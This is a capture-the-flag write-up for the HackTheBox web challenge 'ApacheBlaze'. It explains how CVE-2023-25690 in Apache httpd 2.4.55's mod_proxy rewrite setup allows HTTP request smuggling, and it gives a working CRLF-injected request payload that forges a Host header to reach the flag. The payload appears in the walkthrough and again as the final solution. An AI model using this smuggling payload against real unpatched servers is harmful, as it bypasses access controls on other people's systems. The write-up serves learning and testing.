cd im---
layout: writeup
categories:
  - writeup
title: ApacheBlaze
author: Jaak Weyrich
date: 2023-11-08 01:10:05 +0200
event: HackTheBox Web Challenges
source: https://app.hackthebox.com/challenges
solves: "365"
ctf_categories:
  - web
  - Request Smuggling
image: "img/thumbnail_image.png"
---

## Description
> Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.
## TL;DR
> Some `mod_proxy` configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.

This is exploited in a frontend reverse proxy server to forge a request to a backend server.

## Complete Writeup
We are greeted with the screen below. Looks like the application lets us chose between a couple of games:
![img/thumbnail_image.png]
Before we look at specific code, let's get a feeling for what we're deeling with. The provided files look as follows:
![img/treeCommand.png]
There seems to be not that much code. The backend just has the `app.py` and then there is some frontend stuff involved. Let's take a look at the `app.py` first:
```python
from flask import Flask, request, jsonify

app = Flask(__name__)

app.config['GAMES'] = {'magic_click', 'click_mania', 'hyper_clicker', 'click_topia'}
app.config['FLAG'] = 'HTB{f4k3_fl4g_f0r_t3st1ng}'

@app.route('/', methods=['GET'])
def index():
    game = request.args.get('game')

    if not game:
        return jsonify({
            'error': 'Empty game name is not supported!.'
        }), 400

    elif game not in app.config['GAMES']:
        return jsonify({
            'error': 'Invalid game name!'
        }), 400

    elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
        #if 'dev.apacheblaze.local' in request.headers.get('X-Forwarded-Host'):
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200

    else:
        return jsonify({
            'message': 'This game is currently unavailable due to internal maintenance.'
        }), 200
```
From this backend code, the flag seems to be simply accessible by selecting the `click_topia` game while providing a specific `X-Forwarded-Host` header.
Trying this doesn't work unfortunately. Debugging shows that the X-Forwarded-Host header arriving at the backend looks as follows `dev.apacheblaze.local, localhost:1337, 127.0.0.1:8080`, indicating that my entry does reach it, but other entries are appended as well, causing the check to fail. Let's remember this fact for later.
Looking at the frontend code doesnt help much either, it is simply some index.html along with a pretty simple script in fetchAPI.js:
```javascript
$(document).ready(function() {
  $(".game a").click(function(event) {
      event.preventDefault();
      var gameName = $(this).attr("div");

      $.ajax({
          url: "/api/games/" + gameName,
          success: function(data) {
              var message = data.message;
              $("#gameplayresults").text(message);
          },
          error: function() {
              $("#gameplayresults").text("Error fetching API data.");
          }
      });
  });
});
```
Let's take a look at what else there is to this web application and how it is configured.
The `Dockerfile` reveals some pretty interesting stuff:
```Dockerfile
FROM alpine:3

# Install system packages
RUN apk add --no-cache --update wget apr-dev apr-util-dev gcc libc-dev \
    pcre-dev make musl-dev

# Download and extract httpd
RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz && tar -xvf httpd-2.4.55.tar.gz

WORKDIR httpd-2.4.55

# Compile httpd with desired modules
RUN ./configure \
    --prefix=/usr/local/apache2 \
    --enable-mods-shared=all \
    --enable-deflate \
    --enable-proxy \
    --enable-proxy-balancer \
    --enable-proxy-http \
    && make \
    && make install

# Move compiled httpd binary
RUN mv httpd /usr/local/bin

WORKDIR /

# Copy Apache config files
COPY conf/httpd.conf /tmp/httpd.conf
RUN cat /tmp/httpd.conf >> /usr/local/apache2/conf/httpd.conf

# Can't bind to port 80
RUN sed -i '/^Listen 80$/s/^/#/' /usr/local/apache2/conf/httpd.conf

# Copy challenge files
COPY challenge/frontend/src/. /usr/local/apache2/htdocs/
RUN mkdir /app

# Copy application and configuration files
COPY conf/. /app
COPY challenge/backend/src/. /app

# Install Python dependencies
RUN apk add --update --no-cache \
    g++ \
    python3 \
    python3-dev \
    build-base \
    linux-headers \
    py3-pip \
    && pip install -I --no-cache-dir -r /app/requirements.txt

# Add a system user and group
RUN addgroup -S uwsgi-group && adduser -S -G uwsgi-group uwsgi-user

# Fix permissions
RUN chown -R uwsgi-user:uwsgi-group /usr/local/apache2/logs \
    && chmod 755 /usr/local/apache2/logs \
    && touch /usr/local/apache2/logs/error.log \
    && chown uwsgi-user:uwsgi-group /usr/local/apache2/logs/error.log \
    && chmod 644 /usr/local/apache2/logs/error.log

# Switch user to uwsgi-user
USER uwsgi-user

# Expose Apache's port
EXPOSE 1337

# Run httpd and uwsgi
CMD ["sh", "/app/uwsgi/start_uwsgi.sh"]
```

It downloads httpd (Apache HTTP Server) version 2.4.55 and compiles it with a list of modules. We got a version number, let's google for vulnerabilities. This reveals the following URL, with an HTTP Request Splitting/Smuggling vulnerability right at the top, relevant to the version the server is running on.
https://httpd.apache.org/security/vulnerabilities_24.html
The description of the vulnerability (CVE-2023-25690) states that certain modules have to be used and have to be configured in a certain way for the vulnerability to be present.
![img/ApacheHTTPServerVulnerabilities.png]
Checking the `httpd.conf` file, we can see that the server is actually set up with some sort of multi-layer architecture, using one reverse proxy, one load balancing proxy and 2 backends; this proxy/backend architecture points to the request smuggling vulnerability mentioned above. Taking a closer look, one can even identify the specified module (`mod_proxy`) and recognize the pattern (marked in the above screenshot) along with the necessary RewriteRule for the vulnerability to apply:
```
ServerName _
ServerTokens Prod
ServerSignature Off

Listen 8080
Listen 1337

ErrorLog "/usr/local/apache2/logs/error.log"
CustomLog "/usr/local/apache2/logs/access.log" common

LoadModule rewrite_module modules/mod_rewrite.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so

<VirtualHost *:1337>

    ServerName _

    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on

    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"

</VirtualHost>

<VirtualHost *:8080>

    ServerName _

    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/

    <Proxy balancer://mycluster>
        BalancerMember http://127.0.0.1:8081 route=127.0.0.1
        BalancerMember http://127.0.0.1:8082 route=127.0.0.1
        ProxySet stickysession=ROUTEID
        ProxySet lbmethod=byrequests
    </Proxy>

</VirtualHost>

```
Okay, looks like we have found ourselves a vulnerability, now onto exploiting it. Unfortunately, apache.org (nor any resource it points to) does not describe how to exploit the vulnerability exactly.
A quick google search for a proof of concept for the vulnerability CVE-2023-25690 reveals a github repository that has everything we need:
https://github.com/dhmosfunk/CVE-2023-25690-POC
Injecting `\r\n\r\n` enables splitting the HTTP request and now lets us send new ones from the reverse proxy server. Before we get into the details of the payload, let's understand what the flow of HTTP requests is exactly:
- Our initial request to `GET /api/games/click_topia` is being processed by the reverse proxy running on port 1337. Here, the `mod_proxy` module is enabled and used for handling the request (indicated by the `[P]` in the line of the rewrite rule) and the rewrite rule rewrites `"^/api/games/(.*)"` to `"http://127.0.0.1:8080/?game=$1"`, meaning a request to `/api/games/anything` becomes `http://127.0.0.1:8080/?game=anything`. The latter pattern also matches the endpoint in the backend much better. This request is now forwarded to the load balancing proxy running on port 8080.
- The load balancing proxy receives the request and will forward it to either backend (either on port 8081 or 8082), depending on the current load and the `lbmethod` directive, but this detail does not matter that much in this case.
- The backend receives the request and in case the request is made to `/?game=click_topia`, it will check for `dev.apacheblaze.local` being present in which case the flag will be returned.

Now, it turns out that:
> When acting in a reverse-proxy mode (using the `ProxyPass` directive, for example), `mod_proxy_http` adds several request headers in order to pass information to the origin server. These headers are: [...] X-Forwarded-Host: The original host requested by the client in the `Host` HTTP request header.

This explains why there were other entries in the X-Forwarded-Host header, appended to the one I gave in my first attempt. Both the reverse proxy (port 1337) and the load balancing proxy (port 8080) were acting in a reverse-proxy mode using the ProxyPass directive, making them append the `Host`header in the request the got to the request they forwarded. I.e. I appended `dev.apacheblaze.local` as X-Forwarded-For, requesting the reverse proxy with Host `localhost:1337`, which was appended by the reverse proxy to the request sent to the load balancing proxy with Host `127.0.0.1:8080`, in turn appended by the load balancing proxy in his request to the backend. Now the X-Forwarded-Host header has 3 entries...

Knowing this, I can craft a payload. The first line of a normal http request to the click_topia /game endpoint would look like this:
```
GET /api/games/click_topia HTTP/1.1
Host: localhost:1337
...[other headers]...
Connection: close


```
Mine now looks like this (note the url encoded `\r\n` as `%0d%0a`):
```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
Host: localhost:1337
...[other headers]...
Connection: close


```
The reverse proxy server receiving my initial request, using the rewrite rule, splits this up into two separate http requests:
```
GET /api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local


GET /abc HTTP/1.1
Host: localhost:1337
...[other headers]...
Connection: close
```
These requests are now forwarded to the load balancing proxy (I will receive the response for the first request), the load balancing proxy appends the `Host` header (`dev.apacheblaze.local`) of the request as `X-Forwarded_Host` header, this is sent to the backend and the check is passed.
![img/burpPayloadFlagScreenshot.png]
`HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}`
## Final Solution
```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
Host: localhost:1337
...[other headers]...
Connection: close


```

## Lessons learned
I learned quite something about apache httpd and its different configurations regarding proxies. The challenge also was a refresher for some request smuggling concepts.
